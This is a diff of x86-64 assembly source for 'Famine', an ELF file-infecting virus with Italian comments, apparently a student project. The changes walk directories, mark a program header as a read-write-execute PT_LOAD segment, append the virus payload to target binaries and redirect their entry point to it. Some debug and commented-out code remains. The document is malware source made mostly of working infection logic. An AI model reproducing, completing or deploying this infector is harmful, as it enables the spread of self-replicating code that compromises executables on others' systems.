@@ -164,7 +164,7 @@
 
 	open_my %1, 0, 0
    	test rax, rax					; if open < 0
-   	js _exit						; dunque se in rax ci sta un numero con il segno -> exit(1)
+   	js %%end						; dunque se in rax ci sta un numero con il segno -> exit(1)
    	push rax						; salvo fd
 
    	mov rdi, rax					; 1 arg getdents64
@@ -197,6 +197,7 @@
    		sub r14, r13					; sottraggo la size della struttura dal totale letto
    		cmp r14, 0						; controllo se ho letto tutti i byte restituiti
    		ja %%loop_my
+   	%%end:
 %endmacro
 
 %macro strcmp_for_link_my 1				; nome senza dir
@@ -286,7 +287,7 @@
 			pop r10
 			mov dword [r11 + phdr.p_type], 1 	; PT_LOAD
 			mov dword [r11 + phdr.p_flags], 7 	; PF_R | PF_X | PF_W
-			lea r13, [rel end]
+			lea r13, [rel _exit_payload]
 			lea rsi, [rel _start]
 			sub r13, rsi						; r13 = size payload
 			mov qword [r11 + phdr.p_offset], r10; size file
@@ -305,9 +306,13 @@
 			pop r9
 			;sub r13, 823						; tolgo pad di zeri e jmp
 			write_loop rax, r13, r9
+			;writefd_my insert_jmp, 1, r9		; scrivo opcode jmp
 			%%debug:
-			writefd_my insert_jmp, 1, r9		; scrivo opcode jmp
+			xor rax, rax
+			mov dword eax, ecx
+			;writefd_my rax, 4, r9
 
+			mov qword [r8 + ehdr.e_entry], rsi		; e_entry = p_vaddr
 			strlen_my %1
 			write_my %1, rax
 			write_my string_space, 2
@@ -316,59 +321,88 @@
 		restore_regx
 %endmacro
 
-extern insert_payload
+;extern insert_payload
 
 section .bss
 	linux_dirent64 resb BUF_SIZE
 	stat resb 144
 	buffer resb 4096
+	folder resb 4096
 
 section .text
 	global _start
 
-	struc dirent
-		.d_ino resb 8
-		.d_off resb 8
-		.d_reclen resb 2
-		.d_type resb 1
-		.d_name resb 8
-	endstruc
-
-	struc ehdr
-		.e_ident		resb 16		;	/* File identification. */
-		.e_type			resb 2		;	/* File type. */
-		.e_machine		resb 2		;	/* Machine architecture. */
-		.e_version		resb 4		;	/* ELF format version. */
-		.e_entry		resb 8		;	/* Entry point. */
-		.e_phoff		resb 8		;	/* Program header file offset. */
-		.e_shoff		resb 8		;	/* Section header file offset. */
-		.e_flags		resb 4		;	/* Architecture-specific flags. */
-		.e_ehsize		resb 2		;	/* Size of ELF header in bytes. */
-		.e_phentsize	resb 2		;	/* Size of program header entry. */
-		.e_phnum		resb 2		;	/* Number of program header entries. */
-		.e_shentsize	resb 2		;	/* Size of section header entry. */
-		.e_shnum		resb 2		;	/* Number of section header entries. */
-		.e_shstrndx		resb 2		;	/* Section name strings section. */
-	endstruc
-
-	struc phdr
-		.p_type			resb 4		;	/* Entry type. */
-		.p_flags		resb 4		;	/* Access permission flags. */
-		.p_offset		resb 8		;	/* File offset of contents. */
-		.p_vaddr		resb 8		;	/* Virtual address in memory image. */
-		.p_paddr		resb 8		;	/* Physical address (not used). */
-		.p_filesz		resb 8		;	/* Size of contents in file. */
-		.p_memsz		resb 8		;	/* Size of contents in memory. */
-		.p_align		resb 8		;	/* Alignment in memory and file. */
-	endstruc
-
 _start:
+
+	struc dirent
+    	.d_ino resb 8
+    	.d_off resb 8
+    	.d_reclen resb 2
+    	.d_type resb 1
+    	.d_name resb 8
+    endstruc
+
+    struc ehdr
+    	.e_ident		resb 16		;	/* File identification. */
+    	.e_type			resb 2		;	/* File type. */
+    	.e_machine		resb 2		;	/* Machine architecture. */
+    	.e_version		resb 4		;	/* ELF format version. */
+    	.e_entry		resb 8		;	/* Entry point. */
+    	.e_phoff		resb 8		;	/* Program header file offset. */
+    	.e_shoff		resb 8		;	/* Section header file offset. */
+    	.e_flags		resb 4		;	/* Architecture-specific flags. */
+    	.e_ehsize		resb 2		;	/* Size of ELF header in bytes. */
+    	.e_phentsize	resb 2		;	/* Size of program header entry. */
+    	.e_phnum		resb 2		;	/* Number of program header entries. */
+    	.e_shentsize	resb 2		;	/* Size of section header entry. */
+    	.e_shnum		resb 2		;	/* Number of section header entries. */
+    	.e_shstrndx		resb 2		;	/* Section name strings section. */
+    endstruc
+
+    struc phdr
+    	.p_type			resb 4		;	/* Entry type. */
+    	.p_flags		resb 4		;	/* Access permission flags. */
+    	.p_offset		resb 8		;	/* File offset of contents. */
+    	.p_vaddr		resb 8		;	/* Virtual address in memory image. */
+    	.p_paddr		resb 8		;	/* Physical address (not used). */
+    	.p_filesz		resb 8		;	/* Size of contents in file. */
+    	.p_memsz		resb 8		;	/* Size of contents in memory. */
+    	.p_align		resb 8		;	/* Alignment in memory and file. */
+    endstruc
+
 	check_dir string_dir1
 	check_dir string_dir2
-	exit_my 0
+	;check_finish
+;	mov rdi, folder
+;	mov rsi, 4096
+;	mov rax, 0x4f					; getcwd
+;	syscall
+;	strlen_my folder
+;	cmp rax, 1
+;	jb _exit_famine					; se rax < 1
+;	mov rcx, -1
+;	mov r14, folder
+;	loop_finish:
+;		inc rcx
+;		mov dl, byte [folder + rcx]
+;		cmp dl, '/'
+;		jne _exit_famine
+;		inc rcx
+;		mov dl, byte [folder + rcx]
+;		cmp dl, 't'
+;		jne _exit_famine
+;		inc rcx
+;		mov dl, byte [folder + rcx]
+;		cmp dl, 'm'
+;		jne _exit_famine
+;		inc rcx
+;		mov dl, byte [folder + rcx]
+;		cmp dl, 'p'
+;		jne _exit_famine
+;		je _exit_payload
 
-_exit:
-	exit_my 1
+_exit_famine:
+	exit_my 0
 
 string_space:
 	db 10, 0
@@ -388,5 +422,5 @@ insert_jmp:
 firma:
 	db 'Famine version 1.0 (c)oded by usavoia-usavoia', 0x00
 
-end:
-	;jmp 0xffffffff
+_exit_payload:
+	jmp 0xffffffff
